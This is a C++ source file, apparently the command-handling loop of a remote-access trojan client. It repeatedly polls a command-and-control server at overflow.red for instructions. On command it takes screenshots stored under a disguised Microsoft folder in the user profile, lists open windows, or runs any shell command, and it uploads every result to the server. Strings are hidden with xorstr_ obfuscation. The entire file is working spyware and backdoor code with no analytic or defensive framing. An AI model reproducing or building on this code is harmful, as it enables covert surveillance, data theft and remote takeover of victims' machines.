#include "communication.h"
#include <iostream>

#include "..\utility\requests.h"
#include "functions.h"
#include "../utility/helper.h"
#include "client.h"

namespace client {
	namespace communication {
		void handler_loop() {
			while (true) {
				auto cmd = requests::get_request("https://overflow.red/post.php", "cmd=get_command&ip=" + client::ip);
				if (!cmd.empty()) {	
					char buff[256];
					sprintf_s(buff, "%s", cmd.c_str());
	
					if (cmd == "screenshot") {
						client::functions::take_screenshot(helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**") + std::string("&ip=") + client::ip);
					} 
					else if (cmd == "windows") {
						requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload("All Windows", client::functions::get_all_windows()));
					}
					else {
						auto response = helpers::exec(cmd.c_str());
						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Command Response**\n```\n") + response + xorstr_("\n```"));
					}
				}
			}
		}
	}
}